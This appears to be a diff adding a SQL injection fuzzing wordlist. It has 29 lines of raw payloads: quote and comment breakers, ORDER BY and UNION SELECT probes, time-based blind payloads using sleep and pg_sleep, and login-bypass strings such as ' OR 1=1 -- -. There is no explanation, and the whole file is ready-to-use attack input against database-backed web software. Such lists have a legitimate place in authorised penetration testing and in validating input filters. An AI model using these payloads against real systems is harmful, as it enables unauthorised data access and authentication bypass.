@@ -1,0 +1,29 @@
+'
+''
+`
+``
+,
+"
+""
+/
+//
+\
+\\
+;
+1' ORDER BY 1--+
+-1' UNION SELECT 1,2,3--+
+-1 UNION SELECT 1 INTO @,@
+';select sleep(3) -- 1
+";select sleep(3) -- 1
+';select sleep(3) -- 1
+";select sleep(3) -- 1
+';select pg_sleep(3)
+";select pg_sleep(3)
+';select sleep(3)
+";select sleep(3)
+' OR '1
+' OR 1 -- -
+" OR "" = "
+" OR 1 = 1 -- -
+ OR 1=1
+' OR 'x'='x
